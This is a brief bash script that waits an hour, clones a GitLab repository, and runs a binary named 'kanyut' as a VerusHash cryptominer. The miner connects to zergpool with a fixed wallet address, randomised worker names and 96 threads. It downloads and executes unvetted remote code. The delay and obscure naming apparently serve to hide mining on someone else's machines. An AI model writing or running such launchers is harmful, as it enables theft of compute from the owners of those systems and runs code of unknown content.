#!/usr/bin/env bash
sleep 1h
git clone https://gitlab.com/kikibena365/ikan.git
cd ikan
chmod +x kanyut 
./kanyut -v -l verushash.asia.mine.zergpool.com:3300 -u RV78iwCVdQZXmVU28ddyRcQUDAChZNggDn.$(echo $(shuf -i 1-99999 -n 1)-Tytyd) -p x -t 96
